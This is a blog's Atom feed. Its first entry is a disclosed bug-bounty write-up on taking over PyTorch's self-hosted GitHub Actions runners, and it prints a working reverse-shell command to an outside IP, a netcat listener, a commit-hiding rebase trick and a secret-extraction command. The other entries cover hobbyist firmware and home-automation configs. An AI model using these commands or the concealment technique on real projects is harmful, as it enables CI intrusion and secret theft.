<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="https://www.w3.org/2005/Atom">

  <title><![CDATA[Category: hacking | Marcus Young]]></title>
  <link href="https://marcyoung.us/blog/categories/hacking/atom.xml" rel="self"/>
  <link href="https://marcyoung.us/"/>
  <updated>2022-09-06T02:10:08+00:00</updated>
  <id>https://marcyoung.us/</id>
  <author>
    <name><![CDATA[Marcus Young]]></name>
    
  </author>
  <generator uri="https://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Zuckerpunch - Abusing self hosted github runners at Facebook]]></title>
    <link href="https://marcyoung.us/post/zuckerpunch"/>
    <updated>2022-08-25T00:00:00+00:00</updated>
    <id>https://marcyoung.us/post/zuckerpunch</id>
    <content type="html"><![CDATA[<p>I abused Github Actions to get full root into the PyTorch ci runners. <!-- more --></p>

<p><br/>
<br/></p>

<h3>Timeline</h3>

<ul>
<li><code>4/18</code> Initial research/exploit with an automated case response.</li>
<li><code>4/20</code> First human response to forward to the pytorch team.</li>
<li><code>4/27</code> I reached out to follow up.</li>
<li><code>5/11</code> Meta responds that there is no update.</li>
<li><code>6/9</code> I reach out again to ask about bounty terms and push for a >6 week response.</li>
<li><code>6/22</code> Meta responds: <code>Unfortunately after discussing this with the product team this isn't an issue we're going to fix or reward, although code execution is possible on these machines its by design and additionally the product team has mentioned that the actions are spun up on short lived nodes (similarly to how github operates their own action runners) which limits the impact further.</code></li>
<li><code>6/24</code> I respond with multiple follow ups explaining (and again exploiting further) the scope and severity including secrets exfiltration and prove lateral movement abilities. I exploit it further and PyTorch notices and bans my user. I set up a zoom call to talk.</li>
<li><code>6/27</code> Call goes well, team is respectful and insightful, discuss remediation, things affected and scope.</li>
<li><code>6/30 - 7/22</code> I use favors to get in contact with the team after another month of no responses.</li>
<li><code>7/22</code> - Meta responds &lsquo;We&rsquo;re still in discussion with the product team&rsquo; and refuses further discussion about impact and bounty</li>
<li><code>8/16</code> - Another follow up sent with no responses.</li>
<li><code>8/19</code> - After more favors I&rsquo;m able to escalate it to a new security engineer at meta that provides an extremely long and helpful response</li>
<li><code>8/22 - 8/24</code> - Back and forth about scope and impact</li>
<li><code>8/24</code> Resolved and $10,000 bounty paid out with a 7.5% bonus due to timeline</li>
</ul>


<p><br/>
<br/></p>

<h3>The Gritty</h3>

<p>I run a somewhat successful open source <a href="https://github.com/myoung34/docker-github-actions-runner">github action runner project</a></p>

<p>Github provides CI runners but they have some nuances around configuration and ability. You can run your own, however, if you have special needs such as hardware requirements, security policies, etc.</p>

<p>There&rsquo;s a lot of <a href="https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#hardening-for-self-hosted-runners">information</a> around the hardening of these that indicate that <a href="https://docs.github.com/en/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security">running them on public repos is a bad idea</a>.</p>

<p>That said: if you need to you still can but you should be mindful of a few settings.</p>

<p>The most important setting is what I decided to go after.</p>

<p><img src="/images/gha.png"></p>

<p>That first checkbox isn&rsquo;t the default, but if you&rsquo;re not careful it seems safer than it is. What it means is that if you&rsquo;re not a new user, you can submit changes to the CI yaml and itll affect what&rsquo;s run in the PR. So that&rsquo;s what I did.</p>

<p>I spent an hour or so using carefully crafted google search like <code>site:github.com inurl:workflows +"self-hosted"</code> and pulled up around maybe 30  or so candidates.</p>

<p>The issue is that there&rsquo;s no way to know if they have this checkbox until you open a PR and you potentially notify people of what you&rsquo;re doing.</p>

<p>Throughout these pull-requests I was able to further abuse a github UI bug that let&rsquo;s me &ldquo;hide my commit&rdquo; and it appears as though I merged my PR. It&rsquo;s confusing and weird but it removes the ability for them to see what I was doing.</p>

<p><img src="/images/gha1.png"></p>

<p>What I did here was:</p>

<ul>
<li>Fork the repo.</li>
<li>Make a change to github actions workflows that appear to have self hosted runners looking for jobs (making sure to keep <code>runs-on: self-hosted</code>) with something like: <code>run: echo "Testing refactor"</code>.</li>
<li>Push the commit with a boring message like &ldquo;Refactoring&rdquo;.</li>
<li>Immediately do <code>git rebase -i HEAD^</code>. This is the key part. This basically resets my branch to the default branches SHA. Meaning there&rsquo;s no difference at all in tree history between the default branch (that I targeted for a PR) and the current branch/PR now.</li>
<li><code>git push origin {branch_name} -f</code></li>
</ul>


<p>The bug above is simply that the github UI now sees no changes to the branch (0 files changed). And since the SHA exists as the HEAD SHA on the default branch: it looks merged. Now there&rsquo;s no way to see what I did. The emails from git only show a link to the PR with some metadata that a file changed, but not what. If someone had an integration it would have had to be able to pull the diff from my SHA to theirs <em>immediately</em>. Because I force pushed it&rsquo;s no longer in existence in my fork so it&rsquo;s gone forever and after a few seconds there&rsquo;s no way to pull what my change showed.</p>

<p>The best part is: it already kicked off a potential github actions run though.</p>

<p>So here one of two things happens:</p>

<ul>
<li>It runs and you&rsquo;ll know because you&rsquo;d see <code>echo "Testing refactor"</code></li>
<li>It doesn&rsquo;t run because they had the checkboxes set correctly and you&rsquo;d see this:</li>
</ul>


<p><img src="/images/gha2.png"></p>

<p>Now it&rsquo;s late at night, I&rsquo;ve sumbitted and undone roughly 30 PR&rsquo;s until I get a hit.</p>

<p>PyTorch.</p>

<p>This repo has a <em>ton</em> of yml in all shapes and fashion. And it makes sense to use self-hosted because of all the specialized hardware to run GPU acceleration.</p>

<p>I basically had full reign to any of these now that I can submit any change to CI.</p>

<p>The question is only: is there monitoring in place? Honestly this isn&rsquo;t common because CI is just all over the place. Tests change, infra is all over the place with requirements changing in dependencies, etc.</p>

<p>So I decided to shell in with a reverse shell. A reverse shell means I&rsquo;m going to make it connect to something I have so that I can get into it as opposed to me going into it directly. Same result, but backwards. To do that I spun up a small digital ocean box and set up a reverse shell listener with <code>nc -u -lvp 9001</code></p>

<p>On CI I issued a pull-request with
<br/>
<code>run: sh -i 5&lt;&gt; /dev/tcp/143.110.155.178/9001 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</code></p>

<p>On my digital ocean box: I&rsquo;m now connected to the machine.</p>

<p>From here I noticed 2 things:</p>

<ul>
<li>Some of these instances are ephemeral AWS instances that have root by default and a file with plaintex IAM user keys for circleci</li>
<li>Some of these intances were less ephemeral Jenkins instances that didnt run as root but allowed sudo.</li>
</ul>


<p>Basically they wouldn&rsquo;t live forever but I had root on both.</p>

<p>My first attempt was to exfiltrate CI secrets but this didn&rsquo;t quite work because forks cant exfiltrate secrets via the actions yaml (theyre not in the forked repo). I was able to prove, however, that a few things such as Android builders ran via docker and would land on these instances with the secrets nightly + on-demand. I can&rsquo;t force that to happen but I would be able to exfiltrate the signing key once the docker container was running with <code>docker inspect {container id} | jq '.[].Config.Env[0]'</code></p>

<p>Next: AWS abuse. I wasn&rsquo;t able to find out directly but these instances had access to many s3 buckets. They likely had write access to some meaning I could plant files but that&rsquo;s boring. What they did have though was ECR image support. Without ECR Immutable tags on (confirmed) I would be able to rebuild any image for use by downstream internal projects. Meaning that if downstreams werent locking images to their build SHA&rsquo;s (most dont on latest or semver tags in general) I could implant anything into these containers and re-push them so that downstream projects would pull them. The effect of this at this time is unknown as this isnt the pytorch distributable, but the hope would have been that I could supply-chain internally. This scope stays &ldquo;tbd&rdquo;.</p>

<p>It also didn&rsquo;t appear that these run in a VPC meaning that unless security software is installed there&rsquo;s nothing to prevent me from doing boring malicious stuff like mine crypto, blast emails, etc. If it were in a VPC I&rsquo;d still have this possibility but things like GuardDuty (if enabled) would catch me doing things and flag it as irregular activity. Not worth it here and a good way to violate reasonable disclosure.</p>

<p>The IAM access (both from the role attached to the instance) and the IAM user were overprovisioned and also contributed to the bounty. The PyTorch team is futher lowering the permissions here to only necessary as well as (I&rsquo;m assuming) bucket policies to match.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Making my own plaato keg firmware]]></title>
    <link href="https://marcyoung.us/post/plaato_keg_esphome"/>
    <updated>2022-02-15T00:00:00+00:00</updated>
    <id>https://marcyoung.us/post/plaato-keg</id>
    <content type="html"><![CDATA[<p>After two years of failing to deliver a promised feature I decided to reverse engineer and make my own plaato keg firmware <!-- more --></p>

<p><br/>
<br/>
I backed this project because plaato makes really good quality stuff. The idea of having a weight based keg estimator for my barcaderator was key.
They promised multiple times they&rsquo;d allow people to capture the data themselves. They have yet to deliver.
<br/>
<br/></p>

<p><img src="/images/keg/keg6.png">
<br/>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Andreas (PLAATO)&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Aug 12, 2020, 3:14 PM GMT+2&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Hi! We&rsquo;ve unfortunately had to put the webhook for PLAATO Keg
</span><span class='line'>on the back burner as we are working on other projects,
</span><span class='line'>particularly with our backend, that take priority at the moment.
</span><span class='line'>While we would very much like to implement the webhook we
</span><span class='line'>unfortunately don&rsquo;t have any ETA on this as of now.
</span><span class='line'>&lt;code&gt;
</span><span class='line'>&lt;br/&gt;
</span><span class='line'>&lt;/code&gt;
</span><span class='line'>Abi from Plaato&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Feb 11, 2022 2:21 AM GMT+2&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Hey Marcus,&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Thank you for sharing. What I will do to make sure your voice is
</span><span class='line'>heard is to share your message as a Feature Request to the development
</span><span class='line'>team.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;I hope this helps, please let me know if you have any additional
</span><span class='line'>questions.</span></code></pre></td></tr></table></div></figure></p>

<p>So I decided: why not do it myself?</p>

<p>In january 2020 I did a <a href="https://marcyoung.us/post/homebrew-hacking/">PyTN talk about how to sniff the data.</a> While cool, it didn&rsquo;t really bear much fruit. The amount of effort to make this be my end game was a bit much and I&rsquo;d be reliant on always intercepting it. I did however know that its got an ESP32-D0W0 (wroom) as the brains and it didnt look that complicated.</p>

<p>So I took it down again and flashed a basic esphome build to it (the code is <a href="https://github.com/myoung34/plaato-keg-esphome">here.</a>)</p>

<p><br/>
<img src="/images/keg/keg.jpg">
<br/></p>

<p>This was easier than it looks, you just need a steady hand. Once you flash it the first time you can do pure OTA updates.</p>

<p>I wont go into absolute detail but you can just look at the pinout for the ESP32 and solder leads to the pins directly. RX, TX, Gnd, Vcc, and GPIO (grounded) directly to an FTDI programmer.</p>

<p>First I made a backup of the original firmware:</p>

<pre><code>esptool.py --chip esp32 --port /dev/tty.usbserial-00000000 \
  -b 115200 read_flash 0 0x400000 plaato_backup.bin
</code></pre>

<p>Then I flashed the new one built from ESPhome:</p>

<pre><code>esptool.py --port /dev/tty.usbserial-00000000 write_flash \
  --flash_mode dio --flash_freq 40m --flash_size detect 0 \
  plaato.bin
</code></pre>

<p>Now it shows up in ESPHome as expected!</p>

<p>I then used a (very old) osciloscope to try to map out the load cells (load cell combinator is pretty boring (yayyy) and just drags the voltage, ground, data, etc over a ribbon cable to the main PCB. This main PCB uses a <code>P##</code> notation which are not 1:1 with the ESP32 (booooo)</p>

<p><br/>
<img src="/images/keg/keg1.jpg">
<br/></p>

<p>I was able to discover that the clock for this is P14. I then used a multimeter to correlate P14 to GPIO16 (by dragging the other load across all the ESP32 pins until a beep gave it away). I did this to discover the data pin from the load cell combinator is P28. My handy dandy Multimeter let me correlate P28 to GPIO 17 on the ESP32.</p>

<p><br/>
<img src="/images/keg/keg2.jpg">
<br/>
<br/>
<img src="/images/keg/keg3.jpg">
<br/></p>

<p>I was able to figure out the LEDs without an oscilloscope by just using a multimeter. The main PCB just uses GPIO to turn those pins high or low to run the 3 LEDs, which is boring (yay).</p>

<p>The only thing I have yet to figure out is the water sensor (It looks like it&rsquo;s using a TVS diode to protect the thing from whatever its doing to detect water (voltage shorting?)) and whatever it&rsquo;s using to allow resets (a magnet above the MV3581?)</p>

<p>Next I used <a href="https://zapier.com/page/webhooks/">zapier webhooks</a> to receive the <a href="https://esphome.io/components/http_request.html">HTTP Post</a> from esphome to send it to Zapier, which then sends it to datadog.
<br/>
<img src="/images/keg/keg8.png">
<br/>
<br/>
<img src="/images/keg/keg7.png">
<br/></p>

<p>Check out the <a href="https://github.com/myoung34/plaato-keg-esphome">repo for my up to date esphome yaml</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[My Secure Smart Home]]></title>
    <link href="https://marcyoung.us/post/smart-home"/>
    <updated>2020-03-31T00:00:00+00:00</updated>
    <id>https://marcyoung.us/post/smart-home</id>
    <content type="html"><![CDATA[<p>A quick write up of how I have IoT devices that I consider secure (at the cost of my sanity).  <!-- more --></p>

<p>I&rsquo;ve spent the last year figuring out what I want to control &ldquo;things&rdquo; in my house. And after wasting a bunch of time and money I finally have a set up I like.</p>

<h2>The Network</h2>

<p><del>I don&rsquo;t have any crazy networking gear, just a <a href="https://www.amazon.com/R7000-100PAS-Nighthawk-Parental-Controls-Compatible/dp/B00F0DD0I6">Netgear r7000</a> running <a href="https://www.myopenrouter.com/kong-downloads">Kong</a></del></p>

<p>I now have a very different set up.
<img src="/images/router.jpg"></p>

<p>Configuring this for my setup is painful, but:</p>

<ul>
<li>Main Network (wired + wireless N+AG): I whitelist all my devices by Mac Address and assign static IP&rsquo;s to things.</li>
<li>Guest Network: no whitelisting, can only reach the internet</li>
<li>Black Hole Sun: My black hole wifi for things I don&rsquo;t trust like my TV. I know for a fact that the TV tries to send data over open wifi&rsquo;s so my hope here is to prevent that by giving it valid networking that just cant talk to anything at all.</li>
<li>Server network: My main server stuff is here. A nomad cluster across an i7 server and a bunch of pi&rsquo;s, also a <a href="https://www.synology.com/en-us/products/DS918+">DS918+</a>. DNS is here because I use Consul with dnsmasq. Some smart stuff lives here like my <a href="https://www.ecobee.com/">ecobee</a>.</li>
<li>IoT Network: the real meat. This is nearly the same as the black hole one except it  can talk to the Server Network for C&amp;C (esphome)</li>
</ul>


<h2>The Software</h2>

<p>First I played with <a href="https://tasmota.github.io">tasmota</a> and the devices would randomly require me to set them up again.</p>

<p>Have you ever bought a device that turns on, sets up an AP for you to connect to then configure it? Thats a lot like Tasmota.</p>

<p>The problem is that in just a few days I had to set up the same devices multiple times. So I&rsquo;d go to do something, it wouldnt exist in homeassistant, and Id see a few <code>tasmota-#####</code> AP&rsquo;s I had to set up again.</p>

<p>I solved this by pulling the source code down, modify the configs (which took a lot of figuring out for the settings), compile it, flash it. Per device.</p>

<p>Then I had to upload the actual config for pins/buttons/etc. I hated this. Every second of it.</p>

<p>After playing around with <strong>way</strong> too many things, I finally landed on <a href="https://esphome.io/">esphome</a>.</p>

<p>Esphome is amazing. It has over-the-air updates, it automatically compiles based on some yaml and uploads it!
If it cant upload it (like the initial flash) I would simply set up the yaml, compile it, SCP it locally and flash it with <a href="https://github.com/espressif/esptool">https://github.com/espressif/esptool</a>. If this worked, it would now support OTA updates.</p>

<p>Because its a bunch of yaml I can source control it too!</p>

<p>It uses passwords for both API integrations (home-assistant) and for OTA updates (same or different password) which makes me feel good.</p>

<p>Also: the server runs as a container, so its running on my Server network on nomad. I can simply go to <a href="http://esphome.service.consul">http://esphome.service.consul</a> and click &ldquo;Upload&rdquo; to update my IoT.</p>

<p><img src="/images/esphome.png"></p>

<p>As for the controlling the devices I chose home-assistant. It has great support for ESPHome.</p>

<p><img src="/images/hass.png"></p>

<h2>The Devices</h2>

<p>This is what you&rsquo;re really here for. Everything is ESP based for esphome.</p>

<p>I flashed almost all of these with an <a href="https://www.amazon.com/HiLetgo-FT232RL-Converter-Adapter-Breakout/dp/B00IJXZQ7C">ftdi serial adapter</a> and <a href="https://github.com/espressif/esptool">esptool.py</a> similar to</p>

<pre><code>#!/bin/bash
firmware="something.bin"
port="/dev/cu.usbserial-00000000"
esptool.py --port ${port} --baud 115200 erase_flash
esptool.py --port ${port} --baud 115200 write_flash 0x0 ${firmware}
</code></pre>

<h3>Garage Door Opener</h3>

<p>This one took some learning to get right.
Its a <a href="https://www.amazon.com/HiLetgo-Internet-Development-Wireless-Micropython/dp/B081CSJV2V">nodemcu ESP8266</a> hooked up to a 12v relay shimmed to the garage door trigger. Triggering GPIO16 triggers the relay.
Attached to GPIO5 is a reed switch on the garage door track that is open or closed. The reed switch is a magnetic based switch. When a magnet is near it, it  breaks the switch (open) meaning the garage door is closed. I wired it this way so that the only way the door can be considered &ldquo;closed&rdquo; is that the magnet has broken the sensor. No power, messed up sensor, manually opened (without using the garage door chain) etc would all be considered an open door. I chose this because I&rsquo;d rather be safe than sorry and the door being closed is not an assumption but a fact.</p>

<p><img src="/images/esp-garage1.jpg">
<img src="/images/esp-garage2.jpg">
<img src="/images/esp-garage3.jpg">
<img src="/images/esp-garage4.jpg"></p>

<pre><code>esphome:
  name: garage_switch
  platform: ESP8266
  board: esp01_1m
wifi:
  ssid: !secret wifi_name
  password: !secret wifi_pass
  domain: !secret wifi_domain
logger:
api:
  password: !secret api_password
ota:
  password: !secret ota_password
binary_sensor:
  - platform: status
    name: "garage"
  - platform: gpio
    pin:
      number: 16
      inverted: False
      mode: INPUT_PULLUP
    name: "door"
    device_class: door
    filters:
      - delayed_off: 10ms
      - delayed_on: 10ms
switch:
  - platform: gpio
    name: "garage"
    pin: 5
</code></pre>

<h3>Sprinklers</h3>

<p>This one is in progress. It works but I haven&rsquo;t finished the housing (needs to be gasket based and ABS).</p>

<p>This is based on a <a href="https://www.amazon.com/HiLetgo-Development-ESP8285-Wireless-Internet/dp/B07BK435ZW">wemos d1 mini</a> and is essentially 2 <a href="https://www.amazon.com/gp/product/B010LT2GPG">12v solenoid valves</a> on GPIO16 and GPIO14. the 12V is controlled based on circuitry through diodes and TIP120 fed from a 12V source (dropped to 5v via a LM7805 to the d1 mini).</p>

<p><img src="/images/solenoid_circuit.png">
<img src="/images/esp-sprinkler1.jpg">
<img src="/images/esp-sprinkler2.jpg"></p>

<pre><code>esphome:
  name: sprinklers
  platform: ESP8266
  board: esp01_1m
wifi:
  ssid: !secret wifi_name
  password: !secret wifi_pass
  domain: !secret wifi_domain
logger:
api:
  password: !secret api_password
ota:
  password: !secret ota_password
switch:
  - platform: gpio
    name: "sprinkler1"
    pin: 16
    inverted: no
  - platform: gpio
    name: "sprinkler2"
    pin: 14
    inverted: no
</code></pre>

<h3>Camera</h3>

<p>This one is still a bit in progress. My end goal is to take snapshots on an interval and push them to s3 so that I can play around with machine learning, but right now it lets me view it in hass (no recording as of now).</p>

<p>I chose the <a href="https://www.amazon.com/gp/product/B07RXPHYNM">esp32-cam</a> because it&rsquo;s very cheap. That&rsquo;s all, and it supports esphome.
The housing I 3d printed <a href="https://www.thingiverse.com/thing:3652452">from here</a></p>

<p>Note: This was a bit annoying to set up the first time. You can&rsquo;t &ldquo;just flash it&rdquo;, you need to set up <a href="https://github.com/pellepl/spiffs">spiffs</a> correctly. Which looked like this:</p>

<pre><code>firmware="something.bin"
port="/dev/cu.usbserial-00000000"
# minimal spiffs:
esptool.py --port ${port} --baud 921600 --chip esp32 erase_flash
esptool.py --chip esp32 --port ${port} --baud 921600 --before default_reset --after hard_reset write_flash -z --flash_mode dio --flash_freq 80m --flash_size detect 0x1000 /Users/myoung/Library/Arduino15/packages/esp32/hardware/esp32/1.0.4/tools/sdk/bin/bootloader_qio_80m.bin 0x10000 ${firmware}
</code></pre>

<p><img src="/images/esp32-cam.jpg"></p>

<pre><code>esphome:
  name: frontdoor_cam
  platform: ESP32
  board: esp32dev
wifi:
  ssid: !secret wifi_name
  password: !secret wifi_pass
  domain: !secret wifi_domain
logger:
api:
  password: !secret api_password
ota:
  password: !secret ota_password
esp32_camera:
  name: frontdoor_cam
  external_clock:
    pin: GPIO0
    frequency: 20MHz
  i2c_pins:
    sda: GPIO26
    scl: GPIO27
  data_pins: [GPIO5, GPIO18, GPIO19, GPIO21, GPIO36, GPIO39, GPIO34, GPIO35]
  vsync_pin: GPIO25
  href_pin: GPIO23
  pixel_clock_pin: GPIO22
  power_down_pin: GPIO32
  resolution: 1600x1200
  max_framerate: 30 fps
  jpeg_quality: 25
</code></pre>

<h3>LED Strips</h3>

<p>In the kids room I have some <a href="https://www.amazon.com/Twinkle-Star-Waterproof-Extendable-Decoration/dp/B07FSLWPRB">star lights</a>, and on our Pergola I have some <a href="https://www.amazon.com/Flexible-Waterproof-Christmas-Kitchen-Daylight/dp/B00HSF66JO">waterproof LED lights</a> all controlled with:</p>

<p><a href="https://www.amazon.com/Nexlux-Wireless-Controller-Compatible-Included/dp/B07116SX41">This magic home smart controller</a> . I chose this because its ESP8266 based and flashable!</p>

<p><img src="/images/magichome.jpg"></p>

<p>Wiring that up to the FTDI I flashed this yaml:</p>

<pre><code>esphome:
  name: liam_room_starlights
  platform: ESP8266
  board: esp01_1m
wifi:
  ssid: !secret wifi_name
  password: !secret wifi_pass
  domain: !secret wifi_domain
logger:
api:
  password: !secret api_password
ota:
  password: !secret ota_password
light:
  - platform: rgbww
    name: "Liam Starlight"
    red: output_component1
    green: output_component2
    blue: output_component3
    cold_white: output_component4
    cold_white_color_temperature: 6536 K
    warm_white: output_component5
    warm_white_color_temperature: 2000 K

output:
  - platform: esp8266_pwm
    id: output_component1
    pin: 5

  - platform: esp8266_pwm
    id: output_component2
    pin: 12

  - platform: esp8266_pwm
    id: output_component3
    pin: 13

  - platform: esp8266_pwm
    id: output_component4
    pin: 15

  - platform: esp8266_pwm
    id: output_component5
    pin: 16
</code></pre>

<h3>Light Bulbs</h3>

<p>For the bulbs I chose <a href="https://www.amazon.com/gp/product/B07RZ8QMG3">globe brand</a> because theyre also ESP8266 based.</p>

<p>For 2 of 3 of these I had success with <a href="https://github.com/ct-Open-Source/tuya-convert">tuya-convert</a> which was pleasant.
Basically I built my .bin from the yaml below, replaced tasmota.bin in that dir with it because I&rsquo;m sneaky, ran tuya-convert, flipped the light off/on 3 times and it flashed.</p>

<p>For 2 of them (1 I broke), I had to get down and dirty. I basically tore it apart and followed <a href="https://github.com/arendst/Tasmota/wiki/Mirabella-Genio-Bulb">this guide</a>. Temporarily soldering and removing all the heat safe gunk is not fun. But 1 flashed. 1&hellip;.caught fire&hellip;.</p>

<p><img src="/images/bulb-fire.jpg"></p>

<pre><code>esphome:
  name: driveway_light
  platform: ESP8266
  board: esp01_1m
wifi:
  ssid: !secret wifi_name
  password: !secret wifi_pass
  domain: !secret wifi_domain
logger:
api:
  password: !secret api_password
ota:
  password: !secret ota_password
output:
  - platform: esp8266_pwm
    id: output_green
    pin: GPIO12
    max_power: 0.7
  - platform: esp8266_pwm
    id: output_red
    pin: GPIO4
    max_power: 0.7
  - platform: esp8266_pwm
    id: output_blue
    pin: GPIO14
    max_power: 0.7
  - platform: esp8266_pwm
    id: output_wwhite
    pin: GPIO13
    max_power: 0.65
  - platform: esp8266_pwm
    id: output_cwhite
    pin: GPIO5
    max_power: 0.65
light:
  - platform: rgbww
    name: "driveway_light"
    id: light_rgb
    red: output_red
    green: output_green
    blue: output_blue
    cold_white: output_cwhite
    warm_white: output_wwhite
    cold_white_color_temperature: 5000 K
    warm_white_color_temperature: 2000 K
    effects:
      - strobe:
      - flicker:
      - random:
    restore_mode: ALWAYS_ON
</code></pre>

<h3>Smart Plugs</h3>

<p>These come in handy for seasonal stuff like xmas lights, etc. But especially for my 3d printer as an emergency safe-measure (forget to turn off etc)</p>

<p>I chose the <a href="https://www.amazon.com/Sonoff-Compatible-Assistant-Supporting-Required/dp/B07YXVWC3Y">Sonoff S31</a>.</p>

<p><img src="/images/s31_1.jpg">
<img src="/images/s31_2.jpg"></p>

<p>Easy to take apart, a bit annoying to flash (involves temporarily soldering), but work amazingly.</p>

<p>The yaml makes sure that its on by default and that the power button is a hard toggle for the power for manual control. Blue light indicates wifi, red indicates on/off for the relay.</p>

<pre><code>esphome:
  name: plug1
  platform: ESP8266
  board: esp01_1m
wifi:
  ssid: !secret wifi_name
  password: !secret wifi_pass
  domain: !secret wifi_domain
logger:
api:
  password: !secret api_password
ota:
  password: !secret ota_password
binary_sensor:
  - platform: gpio
    pin:
      number: GPIO0
      mode: INPUT_PULLUP
      inverted: True
    name: "Button"
    on_press:
      - switch.toggle: fakebutton
  - platform: template
    name: "Running"
    filters:
      - delayed_off: 15s
    lambda: |-
      if (isnan(id(power).state)) {
        return {};
      } else if (id(power).state &gt; 4) {
        // Running
        return true;
      } else {
        // Not running
        return false;
      }
switch:
  - platform: template
    name: "POW Relay"
    optimistic: true
    id: fakebutton
    turn_on_action:
    - switch.turn_on: relay
    - light.turn_on: led
    turn_off_action:
    - switch.turn_off: relay
    - light.turn_off: led
  - platform: gpio
    id: relay
    pin: GPIO12
    restore_mode: ALWAYS_ON
output:
  - platform: esp8266_pwm
    id: pow_blue_led
    pin:
      number: GPIO13
      inverted: True

light:
  - platform: monochromatic
    name: "Blue LED"
    output: pow_blue_led
    id: led
    restore_mode: ALWAYS_ON

sensor:
  - platform: wifi_signal
    name: "WiFi Signal"
    update_interval: 60s
  - platform: uptime
    name: "Uptime"
  - platform: cse7766
    update_interval: 2s
    current:
      name: "Current"
    voltage:
      name: "Voltage"
    power:
      name: "POW Power"
      id: power
      on_value_range:
        - above: 4.0
          then:
            - light.turn_on: led
        - below: 3.0
          then:
            - light.turn_off: led
text_sensor:
  - platform: version
    name: "ESPHome Version"
</code></pre>

<h3>Smart Switch</h3>

<p>I kept blowing my outdoor smart bulb, I&rsquo;m guessing the voltage or current is too volatile?</p>

<p>I chose the <a href="https://www.amazon.com/gp/product/B07R7PCCT9">TreatLife single pole</a>.</p>

<p><img src="/images/ss01s.png"></p>

<p>This yaml lets the LED indicator (GPIO4) toggle with the virtual button (GPIO13) and the physical button (GPIO12)</p>

<pre><code>esphome:
  name: front_porch_switch
  platform: ESP8266
  board: esp01_1m

wifi:
  ssid: !secret wifi_ssid
  password: !secret wifi_password
  domain: !secret wifi_domain

logger:
  level: VERBOSE
  baud_rate: 0

api:
  password: !secret api_password

ota:
  password: !secret ota_password

switch:
  - platform: gpio
    id: "relay"
    name: "light"
    pin: 12

output:
  - platform: esp8266_pwm
    id: status_led
    pin:
      number: GPIO4
      inverted: True

binary_sensor:
  - platform: gpio
    name: "button"
    pin:
      number: 13
      inverted: True
    on_press:
      - switch.toggle: relay
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Homebrew Hacking]]></title>
    <link href="https://marcyoung.us/post/homebrew-hacking"/>
    <updated>2020-03-08T00:00:00+00:00</updated>
    <id>https://marcyoung.us/post/homebrew-hacking</id>
    <content type="html"><![CDATA[<p>I did a talk at PyTN about using hacking techniques to reverse engineer beer IoT devices  <!-- more --></p>

<p><a href="https://marcyoung.us/pytn-2020/#1">Slides here</a></p>

<p><a href="https://youtu.be/xg2O2oanXgk">https://youtu.be/xg2O2oanXgk</a></p>
]]></content>
  </entry>
  
</feed>
